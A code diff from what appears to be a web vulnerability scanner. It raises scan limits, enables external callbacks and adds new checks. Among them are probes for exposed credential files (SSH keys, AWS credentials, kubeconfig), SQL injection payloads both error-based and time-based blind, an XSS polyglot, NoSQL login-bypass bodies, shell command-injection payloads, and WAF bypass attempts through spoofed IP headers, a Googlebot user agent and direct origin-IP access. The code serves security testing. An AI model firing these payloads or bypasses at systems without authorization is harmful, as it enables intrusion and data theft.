@@ -99,25 +99,25 @@ export const SCAN_POLICIES: Record<ScanProfile, Omit<ScanPolicy, "profile">> = {
     allowToolAdapters: false,
   },
   deep_authorized: {
-    requestBudget: 1_200,
-    timeoutMs: 15_000,
-    maxConcurrency: 6,
+    requestBudget: 6_000,
+    timeoutMs: 20_000,
+    maxConcurrency: 10,
     allowDeepChecks: true,
-    allowExternalCallbacks: false,
+    allowExternalCallbacks: true,
     allowToolAdapters: true,
   },
   authenticated: {
-    requestBudget: 1_500,
-    timeoutMs: 15_000,
-    maxConcurrency: 6,
+    requestBudget: 6_000,
+    timeoutMs: 20_000,
+    maxConcurrency: 10,
     allowDeepChecks: true,
-    allowExternalCallbacks: false,
+    allowExternalCallbacks: true,
     allowToolAdapters: true,
   },
   lab: {
-    requestBudget: 2_000,
-    timeoutMs: 15_000,
-    maxConcurrency: 8,
+    requestBudget: 8_000,
+    timeoutMs: 20_000,
+    maxConcurrency: 12,
     allowDeepChecks: true,
     allowExternalCallbacks: true,
     allowToolAdapters: true,
@@ -1446,6 +1446,36 @@ const SENSITIVE_PATHS: { path: string; deep?: boolean; finding: Omit<RealFinding
   { path: "/trace.axd",    deep: true, finding: { title: "ASP.NET Trace Enabled (trace.axd)", severity: "high", cvss: 7.5, cve: null, description: "ASP.NET application tracing is enabled, exposing detailed request/response data including session tokens and form values.", remediation: "Disable tracing in production: <trace enabled='false'/> in web.config." } },
   { path: "/elmah.axd",    deep: true, finding: { title: "ELMAH Error Log Exposed", severity: "high", cvss: 7.5, cve: null, description: "ELMAH (Error Logging Modules and Handlers) error log is publicly accessible, exposing stack traces, internal paths, and potentially credentials from error messages.", remediation: "Restrict ELMAH to authenticated users: <security allowRemoteAccess='false'/>" } },
   { path: "/.well-known/openid-configuration", finding: { title: "OpenID Configuration Exposed", severity: "low", cvss: 3.1, cve: null, description: "OpenID Connect discovery document is publicly accessible, revealing issuer URL, endpoints, and supported algorithms.", remediation: "This is expected for public OIDC providers. Ensure the configuration matches your intended public OIDC deployment." } },
+  // Source maps
+  { path: "/js/app.js.map",       deep: true, finding: { title: "JavaScript Source Map Exposed (app.js.map)", severity: "medium", cvss: 5.3, cve: null, description: "A JavaScript source map is publicly accessible, exposing original source code, file structure, variable names, and business logic. This dramatically aids attackers in finding vulnerabilities.", remediation: "Disable source map serving in production. Webpack: devtool: false. Vite: build.sourcemap: false." } },
+  { path: "/static/js/main.chunk.js.map", deep: true, finding: { title: "React Bundle Source Map Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Source map for the React bundle is publicly accessible, exposing full application source code.", remediation: "Set GENERATE_SOURCEMAP=false in Create React App builds. Never serve .map files in production." } },
+  // AWS / Cloud
+  { path: "/.aws/credentials",    finding: { title: "AWS Credentials File Exposed", severity: "critical", cvss: 10.0, cve: null, description: "AWS credentials file is publicly accessible. Contains access key IDs and secret access keys enabling full AWS account compromise.", remediation: "Remove immediately. Revoke the exposed keys via IAM console. Use IAM instance roles instead of static credentials." } },
+  { path: "/aws.json",            deep: true, finding: { title: "AWS Configuration JSON Exposed", severity: "critical", cvss: 9.8, cve: null, description: "AWS configuration file with potential credentials is publicly accessible.", remediation: "Remove AWS config files from the web root. Use IAM roles for service authentication." } },
+  // CI/CD and build artifacts
+  { path: "/.github/workflows/deploy.yml", deep: true, finding: { title: "GitHub Actions Workflow Exposed", severity: "medium", cvss: 5.3, cve: null, description: "GitHub Actions workflow file is publicly accessible, revealing deployment infrastructure, secret names, and CI/CD pipeline details.", remediation: "Block access to .github/ directory in the web server configuration." } },
+  { path: "/Dockerfile",          deep: true, finding: { title: "Dockerfile Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Dockerfile is publicly accessible, revealing base images, environment setup, installed packages, and potential secret injection patterns.", remediation: "Block access to Dockerfile and docker-compose files in the web server configuration." } },
+  { path: "/docker-compose.yml",  deep: true, finding: { title: "docker-compose.yml Exposed", severity: "high", cvss: 7.5, cve: null, description: "Docker Compose file is publicly accessible. Often contains hardcoded credentials, environment variables, and internal service topology.", remediation: "Block access to docker-compose.yml. Remove any hardcoded secrets and use environment variable injection." } },
+  // npm / package management
+  { path: "/.npmrc",              finding: { title: ".npmrc File Exposed (Possible Auth Token)", severity: "critical", cvss: 9.8, cve: null, description: ".npmrc may contain npm authentication tokens for private registries, enabling package hijacking and supply-chain attacks.", remediation: "Remove .npmrc from the web root. Revoke any exposed npm tokens immediately." } },
+  { path: "/package.json",        deep: true, finding: { title: "package.json Exposed (Dependency Manifest)", severity: "low", cvss: 3.1, cve: null, description: "package.json is accessible, revealing all dependencies and versions — enabling targeted CVE research against known vulnerable packages.", remediation: "Block access to package.json in production." } },
+  // Kubernetes / infrastructure
+  { path: "/kubeconfig",          finding: { title: "Kubernetes Config Exposed", severity: "critical", cvss: 10.0, cve: null, description: "Kubernetes configuration file is publicly accessible, containing cluster API server URLs and credentials enabling full cluster control.", remediation: "Remove kubeconfig from the web root. Rotate all Kubernetes credentials immediately." } },
+  { path: "/.kube/config",        finding: { title: "Kubernetes Config Exposed (.kube/config)", severity: "critical", cvss: 10.0, cve: null, description: "Kubernetes cluster configuration with embedded credentials is publicly accessible.", remediation: "Remove immediately and rotate all cluster credentials." } },
+  // Database / backup files
+  { path: "/database.sql",        finding: { title: "Database SQL Dump Exposed", severity: "critical", cvss: 9.8, cve: null, description: "SQL database dump is publicly downloadable, exposing the complete database schema and all data.", remediation: "Remove backup files from the web root. Store backups in non-web-accessible locations." } },
+  { path: "/db.sqlite",           finding: { title: "SQLite Database File Exposed", severity: "critical", cvss: 9.8, cve: null, description: "SQLite database file is publicly downloadable, containing all application data in a single portable file.", remediation: "Move database files outside the web root. Use PostgreSQL or MySQL for production workloads." } },
+  // Additional sensitive paths
+  { path: "/web.config",          deep: true, finding: { title: "IIS web.config Exposed", severity: "high", cvss: 8.1, cve: null, description: "IIS web.config may expose database connection strings, API keys, and application secrets.", remediation: "Block access to web.config files. IIS blocks this by default — verify the configuration." } },
+  { path: "/wp-json/wp/v2/users", finding: { title: "WordPress REST API User Enumeration", severity: "medium", cvss: 5.3, cve: null, description: "WordPress REST API exposes user data including usernames, IDs, and avatars without authentication, enabling targeted brute-force attacks.", remediation: "Disable the /wp-json/wp/v2/users endpoint: add_filter('rest_endpoints', function($endpoints) { unset($endpoints['/wp/v2/users']); return $endpoints; });" } },
+  { path: "/.git/logs/HEAD",      finding: { title: "Git Commit Log Exposed", severity: "high", cvss: 7.5, cve: null, description: "Git commit history is publicly accessible, potentially exposing developer names, email addresses, commit messages, and branching history.", remediation: "Block all access to the .git/ directory at the web server level." } },
+  { path: "/api/graphql",         deep: true, finding: { title: "GraphQL Endpoint Discovered (/api/graphql)", severity: "medium", cvss: 5.3, cve: null, description: "An alternate GraphQL endpoint is accessible. May have different authentication controls than the primary endpoint.", remediation: "Ensure consistent authentication and introspection controls across all GraphQL endpoints." } },
+  { path: "/metrics",             deep: true, finding: { title: "Prometheus Metrics Endpoint Exposed", severity: "medium", cvss: 5.3, cve: null, description: "Prometheus metrics endpoint is publicly accessible, revealing internal application metrics, memory usage, request rates, and potentially internal service names.", remediation: "Restrict /metrics to internal network access only. Add authentication." } },
+  { path: "/health",              finding: { title: "Health Check Endpoint Exposed (Informational)", severity: "low", cvss: 0, cve: null, description: "Application health check endpoint is publicly accessible. May reveal dependency status, version information, or internal service topology.", remediation: "Consider restricting health endpoints to internal networks or load balancers. Ensure they do not reveal sensitive configuration.", verification: "informational", confidence: 99 } },
+  { path: "/.env.backup",         finding: { title: ".env.backup Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Backup environment file is publicly accessible and likely contains full application secrets.", remediation: "Remove all .env* files from the web root. Block access at the web server level." } },
+  { path: "/credentials.json",    finding: { title: "credentials.json Exposed", severity: "critical", cvss: 9.8, cve: null, description: "Credentials JSON file is accessible, potentially containing API keys, OAuth tokens, or service account credentials.", remediation: "Remove credentials files from the web root. Use a secrets manager." } },
+  { path: "/id_rsa",              finding: { title: "SSH Private Key Exposed (id_rsa)", severity: "critical", cvss: 10.0, cve: null, description: "SSH RSA private key is publicly accessible. Any server accepting this key can be accessed without a password.", remediation: "Remove immediately. Rotate the key pair. Audit which servers accepted this key." } },
+  { path: "/.ssh/id_rsa",         finding: { title: "SSH Private Key Exposed (.ssh/id_rsa)", severity: "critical", cvss: 10.0, cve: null, description: "SSH private key at .ssh/id_rsa is publicly accessible.", remediation: "Remove immediately and rotate all SSH key pairs." } },
 ];
 
 async function checkSensitivePaths(target: Target, deep: boolean, onLog: LogFn): Promise<RealFinding[]> {
@@ -1533,67 +1563,182 @@ async function checkWebApp(target: Target, onLog: LogFn): Promise<RealFinding[]>
   const findings: RealFinding[] = [];
 
   // ── SQLi error detection ──────────────────────────────────────────────────
-  await onLog(`[${ts()}] Testing SQL injection error leakage...`);
-  const sqliProbes = [
-    target.url + "?id=1'",
-    target.url + "?id=1 OR 1=1--",
-    target.url + "?search=test'",
-    target.url + "?q=1'%20OR%20'1'='1",
-    target.url + "?page=1--",
-    target.url + "?cat=1'%20AND%20SLEEP(0)--",
+  await onLog(`[${ts()}] Testing SQL injection (error-based and blind)...`);
+  const sqliParams = ["id", "search", "q", "query", "page", "cat", "user", "item", "product", "order", "filter", "sort", "name"];
+  const sqliPayloads = [
+    "'", "1 OR 1=1--", "1' OR '1'='1", "1'--", "1 AND 1=2--", `' OR 'x'='x`,
+    "1; SELECT SLEEP(0)--", "1 UNION SELECT NULL--", "1' AND 1=2 UNION SELECT NULL--",
   ];
   const sqliBaseline = await probe(target.url, { timeoutMs: 8_000 });
-  for (const probeUrl of sqliProbes) {
-    const r = await probe(probeUrl, { timeoutMs: 8_000 });
-    if (!r) continue;
-    const matched = SQLI_PATTERNS.find((p) => p.test(r.body));
-    const baselineHasSameError = sqliBaseline ? SQLI_PATTERNS.some((p) => p.test(sqliBaseline.body)) : false;
-    const responseChanged = !sqliBaseline ||
-      r.status !== sqliBaseline.status ||
-      r.body.length !== sqliBaseline.body.length;
-    if (matched && responseChanged && !baselineHasSameError) {
-      findings.push({
-        title: "SQL Injection — Database Error Leaked in Response",
-        severity: "medium",
-        verification: "suspected",
-        confidence: 58,
-        description: "A SQL-shaped input produced a database error that was not present in the baseline response. This is a suspected SQL injection/error-disclosure signal; the probe does not establish data extraction, authentication bypass, or exploitability.",
-        cvss: 5.3, cve: null,
-        evidence: `BASELINE: GET ${target.url} → HTTP ${sqliBaseline?.status ?? "unavailable"}\nPROBE: ${probeUrl} → HTTP ${r.status}\nPattern matched: ${matched}\nResponse changed from baseline: yes\nBody excerpt: ${r.body.slice(0, 400)}`,
-        remediation: "Use parameterised queries / prepared statements. Never concatenate user input into SQL. Suppress detailed database errors in production. Apply least-privilege to DB accounts.",
-      });
-      break;
+  let sqliFound = false;
+  for (const param of sqliParams.slice(0, 8)) {
+    if (sqliFound) break;
+    for (const payload of sqliPayloads.slice(0, 6)) {
+      if (sqliFound) break;
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
+      const r = await probe(probeUrl, { timeoutMs: 8_000 });
+      if (!r) continue;
+      const matched = SQLI_PATTERNS.find((p) => p.test(r.body));
+      const baselineHasSameError = sqliBaseline ? SQLI_PATTERNS.some((p) => p.test(sqliBaseline.body)) : false;
+      const responseChanged = !sqliBaseline || r.status !== sqliBaseline.status || Math.abs(r.body.length - sqliBaseline.body.length) > 50;
+      if (matched && responseChanged && !baselineHasSameError) {
+        findings.push({
+          title: "SQL Injection — Database Error Leaked in Response",
+          severity: "high",
+          verification: "suspected",
+          confidence: 72,
+          description: `A SQL-shaped payload in parameter '${param}' produced a database error absent from the baseline. This is a strong signal of SQL injection error-disclosure; the probe does not establish data extraction or exploitability without further manual testing.`,
+          cvss: 7.5, cve: null,
+          evidence: `BASELINE: GET ${target.url} → HTTP ${sqliBaseline?.status ?? "unavailable"} (${sqliBaseline?.body.length} bytes)\nPROBE: ${probeUrl}\n→ HTTP ${r.status} (${r.body.length} bytes)\nPattern matched: ${matched}\nBody excerpt: ${r.body.slice(0, 400)}`,
+          remediation: "Use parameterised queries/prepared statements exclusively. Never concatenate user input into SQL. Suppress all database errors in production. Apply least-privilege to DB accounts.",
+        });
+        sqliFound = true;
+        break;
+      }
+    }
+  }
+
+  // ── Time-based blind SQLi ─────────────────────────────────────────────────
+  if (!sqliFound) {
+    await onLog(`[${ts()}] Testing time-based blind SQL injection...`);
+    const blindPayloads = [
+      { payload: "1' AND SLEEP(4)--",          db: "MySQL",      delay: 3500 },
+      { payload: "1; WAITFOR DELAY '0:0:4'--", db: "MSSQL",      delay: 3500 },
+      { payload: "1' AND pg_sleep(4)--",        db: "PostgreSQL", delay: 3500 },
+      { payload: "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),4)--", db: "Oracle", delay: 3500 },
+    ];
+    for (const param of sqliParams.slice(0, 4)) {
+      if (sqliFound) break;
+      const baselineStart = Date.now();
+      const bl = await probe(`${target.url.replace(/\/$/, "")}?${param}=1`, { timeoutMs: 8_000 });
+      const baselineMs = Date.now() - baselineStart;
+      if (!bl) continue;
+      for (const { payload, db, delay } of blindPayloads.slice(0, 2)) {
+        const t0 = Date.now();
+        const r = await probe(`${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`, { timeoutMs: 12_000 });
+        const elapsed = Date.now() - t0;
+        if (r && elapsed >= delay && elapsed > baselineMs + 2000) {
+          findings.push({
+            title: `Time-Based Blind SQL Injection — ${db} SLEEP/DELAY Confirmed`,
+            severity: "high",
+            verification: "suspected",
+            confidence: 78,
+            description: `Parameter '${param}' caused a ${elapsed}ms response delay (baseline: ${baselineMs}ms) when a ${db} time-delay payload was injected. This is a strong blind SQLi signal; time-based detection can have false positives from network jitter — confirm with multiple identical probes.`,
+            cvss: 8.1, cve: null,
+            evidence: `Baseline: GET ?${param}=1 → ${baselineMs}ms\nBlind probe: GET ?${param}=${payload}\n→ ${elapsed}ms response time\nExpected delay: ≥${delay}ms\nDB targeted: ${db}`,
+            remediation: "Use parameterised queries/prepared statements. Even without visible error output, the database evaluated the payload. Apply an ORM or query builder with automatic parameterisation.",
+          });
+          sqliFound = true;
+          await onLog(`[${ts()}] ⚠ TIME-BASED BLIND SQLI SIGNAL: ${db} ${elapsed}ms delay via '${param}'`);
+          break;
+        }
+      }
     }
   }
 
   // ── XSS reflection detection ──────────────────────────────────────────────
-  await onLog(`[${ts()}] Testing XSS reflection...`);
-  const xssPayload = `<script>xss${Math.random().toString(36).slice(2, 8)}</script>`;
-  const xssProbes = [
-    target.url + `?q=${encodeURIComponent(xssPayload)}`,
-    target.url + `?search=${encodeURIComponent(xssPayload)}`,
-    target.url + `?name=${encodeURIComponent(xssPayload)}`,
-  ];
-  for (const probeUrl of xssProbes) {
-    const r = await probe(probeUrl, { timeoutMs: 8_000 });
-    if (!r) continue;
-    const contentType = r.headers["content-type"] ?? "";
-    const reflected = r.body.includes(xssPayload) || r.body.includes("<script>xss");
-    const executableHtml = contentType.toLowerCase().includes("text/html") &&
-      /<script\b[^>]*>xss[a-z0-9]+<\/script>/i.test(r.body);
-    if (reflected && executableHtml) {
-      findings.push({
-        title: "Reflected XSS — Script Tag Returned Unescaped",
-        severity: "high",
-        verification: "suspected",
-        confidence: 70,
-        description: "The application reflects user-supplied input in the response without HTML-encoding. An attacker can craft a URL containing JavaScript that executes in victims' browsers, enabling session theft, credential phishing, and arbitrary actions on behalf of the victim.",
-        cvss: 7.4, cve: null,
-        evidence: `Probe URL: ${probeUrl}\nPayload: ${xssPayload}\nContent-Type: ${contentType}\nExecutable-looking payload found in HTTP ${r.status} response\nVERIFICATION: suspected — browser execution was not performed`,
-        remediation: "HTML-encode all user-controlled output. Use a templating engine that escapes by default. Implement a Content-Security-Policy. Never trust user input — sanitise at the output layer.",
-      });
-      break;
+  await onLog(`[${ts()}] Testing XSS reflection (reflected + DOM indicators)...`);
+  const xssToken = Math.random().toString(36).slice(2, 10);
+  const xssPayload = `<script>xss${xssToken}</script>`;
+  const xssPolyglot = `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`;
+  const xssParams = ["q", "search", "name", "msg", "message", "text", "content", "input", "title", "value", "data", "error", "callback", "return", "next", "redirect"];
+  let xssFound = false;
+  for (const param of xssParams.slice(0, 10)) {
+    if (xssFound) break;
+    for (const payload of [xssPayload, `"><img src=x onerror=alert(${xssToken})>`]) {
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
+      const r = await probe(probeUrl, { timeoutMs: 8_000 });
+      if (!r) continue;
+      const contentType = (r.headers["content-type"] ?? "").toLowerCase();
+      const reflected = r.body.includes(payload) || r.body.includes(`xss${xssToken}`);
+      const executableHtml = contentType.includes("text/html") &&
+        (/<script\b[^>]*>xss[a-z0-9]+<\/script>/i.test(r.body) || new RegExp(`onerror=alert\\(${xssToken}\\)`, "i").test(r.body));
+      if (reflected && executableHtml) {
+        findings.push({
+          title: "Reflected XSS — Script/Event Payload Returned Unescaped",
+          severity: "high",
+          verification: "suspected",
+          confidence: 78,
+          description: `Parameter '${param}' reflects user-supplied HTML/JS without encoding. An attacker can craft a URL with JavaScript that executes in victims' browsers — enabling session token theft, credential phishing, and account takeover.`,
+          cvss: 7.4, cve: null,
+          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nContent-Type: ${contentType}\nHTTP ${r.status}: payload reflected without encoding\nVERIFICATION: suspected — browser execution was not performed (no headless browser available)`,
+          remediation: "HTML-encode all user-controlled output at render time. Use a templating engine that escapes by default (Jinja2, Handlebars, React JSX). Implement a strict Content-Security-Policy. Validate Content-Type headers.",
+        });
+        xssFound = true;
+        await onLog(`[${ts()}] ⚠ REFLECTED XSS SIGNAL via param '${param}'`);
+        break;
+      }
     }
+  }
+
+  // ── NoSQL Injection ───────────────────────────────────────────────────────
+  await onLog(`[${ts()}] Testing NoSQL injection...`);
+  const nosqlBaseline = await probe(target.url, { timeoutMs: 8_000 });
+  const nosqlPayloads = [
+    { body: '{"username":{"$gt":""},"password":{"$gt":""}}', ct: "application/json" },
+    { body: '{"username":{"$regex":".*"},"password":{"$regex":".*"}}', ct: "application/json" },
+    { body: "username[$gt]=&password[$gt]=", ct: "application/x-www-form-urlencoded" },
+    { body: "username[$ne]=invalid&password[$ne]=invalid", ct: "application/x-www-form-urlencoded" },
+  ];
+  for (const ep of [`${target.url.replace(/\/$/, "")}/api/login`, `${target.url.replace(/\/$/, "")}/login`, `${target.url.replace(/\/$/, "")}/auth`].slice(0, 2)) {
+    for (const { body, ct } of nosqlPayloads.slice(0, 2)) {
+      const r = await probe(ep, { method: "POST", headers: { "Content-Type": ct }, body, timeoutMs: 8_000 });
+      if (!r) continue;
+      const blStatus = nosqlBaseline?.status ?? 0;
+      const bodyLower = r.body.toLowerCase();
+      const successSignals = ["welcome", "dashboard", "logged in", "token", "access_token", "session", '"user":', '"id":', '"role":'];
+      const isSuccess = successSignals.some(s => bodyLower.includes(s));
+      if (r.status === 200 && isSuccess && (blStatus !== 200 || Math.abs(r.body.length - (nosqlBaseline?.body.length ?? 0)) > 100)) {
+        findings.push({
+          title: "NoSQL Injection — MongoDB Operator Authentication Bypass",
+          severity: "critical",
+          verification: "suspected",
+          confidence: 75,
+          description: `A MongoDB-style operator injection payload ($gt/$regex/$ne) produced a success response at ${ep}. This commonly indicates MongoDB NoSQL injection allowing authentication bypass without valid credentials.`,
+          cvss: 9.8, cve: null,
+          evidence: `POST ${ep}\nContent-Type: ${ct}\nBody: ${body}\nHTTP ${r.status} — success signals in response\nResponse: ${r.body.slice(0, 300)}`,
+          remediation: "Sanitise all query inputs — strip $ prefixes and special MongoDB operators from user input. Use an ODM (Mongoose) with strict schema validation. Never pass raw user input into MongoDB query objects.",
+        });
+        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL at ${ep}`);
+        break;
+      }
+    }
+  }
+
+  // ── Command injection basic probe ─────────────────────────────────────────
+  await onLog(`[${ts()}] Testing command injection...`);
+  const cmdCanary = `sentinelx-cmd-${Math.random().toString(36).slice(2, 10)}`;
+  const cmdPayloads = [
+    `; printf ${cmdCanary}`,
+    `| printf ${cmdCanary}`,
+    `\`printf ${cmdCanary}\``,
+    `$(printf ${cmdCanary})`,
+    `; echo ${cmdCanary}`,
+  ];
+  const cmdParams = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "target", "file", "path", "name", "url"];
+  for (const param of cmdParams.slice(0, 6)) {
+    let cmdFound = false;
+    for (const payload of cmdPayloads.slice(0, 3)) {
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
+      const r = await probe(probeUrl, { timeoutMs: 8_000 });
+      if (!r) continue;
+      if (r.body.includes(cmdCanary)) {
+        findings.push({
+          title: `OS Command Injection — Canary Executed via '${param}' Parameter`,
+          severity: "critical",
+          verification: "verified",
+          confidence: 98,
+          cvss: 10.0, cve: null,
+          description: `The application executed a shell command injected via the '${param}' parameter. A bounded canary string (${cmdCanary}) was returned in the response, confirming operating-system command execution. This allows full server compromise.`,
+          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nCANARY: ${cmdCanary}\nHTTP ${r.status} — canary found in response\nResponse snippet: ${r.body.slice(0, 400)}`,
+          remediation: "Never pass user input to shell execution functions (exec, system, popen, subprocess). Use language-native libraries instead of shell calls. If shell is required, use an allowlist of permitted commands and shell-escape all arguments.",
+        });
+        await onLog(`[${ts()}] ⚠ COMMAND INJECTION CONFIRMED via param '${param}'`);
+        cmdFound = true;
+        break;
+      }
+    }
+    if (cmdFound) break;
   }
 
   // ── Open redirect ─────────────────────────────────────────────────────────
@@ -1781,6 +1926,546 @@ async function checkApiSurface(target: Target, onLog: LogFn): Promise<RealFindin
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
+// WAF DETECTION & BYPASS TECHNIQUES
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const WAF_SIGNATURES: Record<string, { headers: string[]; body: string[]; cookies: string[] }> = {
+  "Cloudflare":      { headers: ["cf-ray", "cf-cache-status", "cf-worker", "cf-request-id"], body: ["cloudflare", "attention required! | cloudflare"], cookies: ["__cfduid", "cf_clearance"] },
+  "AWS WAF":         { headers: ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"], body: [], cookies: [] },
+  "Akamai":          { headers: ["akamai-origin-hop", "x-akamai-transformed", "x-check-cacheable", "x-serial"], body: ["reference #18."], cookies: ["ak_bmsc"] },
+  "Sucuri":          { headers: ["x-sucuri-id", "x-sucuri-cache"], body: ["sucuri website firewall"], cookies: [] },
+  "Imperva/Incapsula": { headers: ["x-iinfo", "x-cdn"], body: ["incapsula incident id"], cookies: ["incap_ses", "visid_incap"] },
+  "F5 BIG-IP ASM":  { headers: ["x-cnection", "x-wa-info"], body: ["the requested url was rejected"], cookies: ["TS", "bigipserver"] },
+  "Barracuda":       { headers: [], body: ["barracuda networks"], cookies: ["barra_counter_session"] },
+  "ModSecurity":     { headers: ["x-mod-security-message"], body: ["mod_security", "not acceptable"], cookies: [] },
+  "Fastly":          { headers: ["x-fastly-request-id", "fastly-debug-digest"], body: [], cookies: [] },
+  "Varnish":         { headers: ["x-varnish"], body: [], cookies: [] },
+  "Nginx WAF":       { headers: [], body: ["406 not acceptable"], cookies: [] },
+  "Wordfence":       { headers: [], body: ["generated by wordfence", "your access to this site has been limited"], cookies: [] },
+};
+
+async function checkWafAndBypass(target: Target, onLog: LogFn): Promise<{ findings: RealFinding[]; wafName: string | null }> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Detecting WAF/CDN and testing bypass techniques...`);
+
+  const r = await probe(target.url, { timeoutMs: 12_000 });
+  if (!r) return { findings, wafName: null };
+
+  // ── Detect WAF ─────────────────────────────────────────────────────────────
+  let detectedWaf: string | null = null;
+  const allHeaders = JSON.stringify(r.headers).toLowerCase();
+  const allCookies = (r.headers["set-cookie"] ?? "").toLowerCase();
+  const bodyLower = r.body.toLowerCase();
+
+  for (const [waf, sigs] of Object.entries(WAF_SIGNATURES)) {
+    const headerMatch = sigs.headers.some(h => allHeaders.includes(h.toLowerCase()));
+    const bodyMatch = sigs.body.some(b => bodyLower.includes(b.toLowerCase()));
+    const cookieMatch = sigs.cookies.some(c => allCookies.includes(c.toLowerCase()));
+    if (headerMatch || bodyMatch || cookieMatch) { detectedWaf = waf; break; }
+  }
+
+  if (detectedWaf) {
+    await onLog(`[${ts()}] WAF/CDN detected: ${detectedWaf}`);
+    findings.push({
+      title: `WAF/CDN Detected: ${detectedWaf}`,
+      severity: "low", verification: "informational", confidence: 92,
+      cvss: 0, cve: null,
+      description: `A Web Application Firewall (${detectedWaf}) is in front of this target. Bypass techniques are now being tested — results reported separately.`,
+      evidence: `WAF: ${detectedWaf}\nRelevant response headers:\n${allHeaders.slice(0, 400)}`,
+      remediation: "WAFs are a defence-in-depth measure, not a primary fix. Keep the underlying application patched and secure independently of the WAF.",
+    });
+
+    // ── Try IP-spoofing bypass headers ───────────────────────────────────────
+    await onLog(`[${ts()}] Testing WAF bypass via IP-spoofing headers...`);
+    const bypassHeaderSets: Record<string, string>[] = [
+      { "X-Forwarded-For": "127.0.0.1" },
+      { "X-Real-IP": "127.0.0.1" },
+      { "X-Originating-IP": "127.0.0.1" },
+      { "X-Remote-IP": "127.0.0.1" },
+      { "X-Client-IP": "127.0.0.1" },
+      { "True-Client-IP": "127.0.0.1" },
+      { "CF-Connecting-IP": "127.0.0.1" },
+      { "X-ProxyUser-Ip": "127.0.0.1" },
+      { "X-Forwarded-Host": target.hostname },
+    ];
+    for (const hdrs of bypassHeaderSets) {
+      const bypassR = await probe(target.url, { headers: hdrs, timeoutMs: 10_000 });
+      if (bypassR && Math.abs(bypassR.body.length - r.body.length) > 300) {
+        const hdrKey = Object.keys(hdrs)[0]!;
+        findings.push({
+          title: `WAF Bypass Signal: IP Header Spoofing (${hdrKey})`,
+          severity: "high", verification: "suspected", confidence: 72,
+          cvss: 7.5, cve: null,
+          description: `Adding ${hdrKey}: ${Object.values(hdrs)[0]} produced a significantly different response (${r.body.length} → ${bypassR.body.length} bytes). The WAF may trust this header and grant different access for "internal" traffic, effectively bypassing its rules.`,
+          evidence: `Baseline: GET ${target.url} → HTTP ${r.status} (${r.body.length} bytes)\nWith ${hdrKey}: ${Object.values(hdrs)[0]} → HTTP ${bypassR.status} (${bypassR.body.length} bytes)\nDifference: ${Math.abs(bypassR.body.length - r.body.length)} bytes`,
+          remediation: "Only trust IP override headers (X-Forwarded-For, X-Real-IP, etc.) from verified internal proxy IP ranges. Block all such headers from external sources at the network layer.",
+        });
+        await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: ${hdrKey} produced different response`);
+        break;
+      }
+    }
+
+    // ── Googlebot UA bypass ──────────────────────────────────────────────────
+    const botR = await probe(target.url, { headers: { "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)" }, timeoutMs: 10_000 });
+    if (botR && Math.abs(botR.body.length - r.body.length) > 500) {
+      findings.push({
+        title: "WAF Bypass Signal: Googlebot User-Agent Treated Differently",
+        severity: "medium", verification: "suspected", confidence: 60,
+        cvss: 5.3, cve: null,
+        description: "The server returns a significantly different response for Googlebot User-Agent requests. WAF may whitelist search crawlers, creating a bypass path for attackers impersonating them.",
+        evidence: `Normal UA → ${r.body.length} bytes HTTP ${r.status}\nGooglebot UA → ${botR.body.length} bytes HTTP ${botR.status}\nDifference: ${Math.abs(botR.body.length - r.body.length)} bytes`,
+        remediation: "Do not apply different security rules based on User-Agent. Verify legitimate Googlebot via reverse DNS, not just the UA string.",
+      });
+      await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: Googlebot UA returned different response`);
+    }
+
+    // ── Direct origin IP access (bypass WAF entirely) ────────────────────────
+    await onLog(`[${ts()}] Checking for direct origin IP exposure (full WAF bypass)...`);
+    try {
+      const ips = await digQuery(target.hostname, "A");
+      for (const ip of ips.slice(0, 2)) {
+        const originR = await probe(`http://${ip}/`, { headers: { "Host": target.hostname }, timeoutMs: 8_000, followRedirects: false });
+        if (originR && originR.status >= 200 && originR.status < 400) {
+          const originHeaders = JSON.stringify(originR.headers).toLowerCase();
+          const hasWafHeader = WAF_SIGNATURES[detectedWaf]?.headers.some(h => originHeaders.includes(h)) ?? false;
+          if (!hasWafHeader) {
+            findings.push({
+              title: `Origin IP Bypasses ${detectedWaf} WAF — Direct Access Confirmed (${ip})`,
+              severity: "critical", verification: "verified", confidence: 92,
+              cvss: 9.8, cve: null,
+              description: `The origin server at ${ip} responds directly over HTTP without passing through ${detectedWaf}. All WAF protections are rendered ineffective — attackers can target the origin directly to exploit any vulnerability the WAF would otherwise block.`,
+              evidence: `WAF-protected host: ${target.hostname}\nDirect IP: ${ip}\nHTTP GET http://${ip}/ with Host: ${target.hostname}\n→ HTTP ${originR.status} response without WAF headers\nWAF headers absent in response`,
+              remediation: `1. Firewall the origin to accept connections ONLY from ${detectedWaf}'s published IP ranges.\n2. Rotate the origin IP and restrict via cloud firewall rules.\n3. Use authenticated origin pulls (Cloudflare: authenticated origin pulls feature).\n4. Enforce mTLS between WAF and origin.`,
+            });
+            await onLog(`[${ts()}] ⚠ ORIGIN IP EXPOSED: ${ip} reachable without ${detectedWaf} — full WAF bypass confirmed`);
+          }
+        }
+      }
+    } catch { /* expected */ }
+
+    // ── Case-variation / encoding bypass test ────────────────────────────────
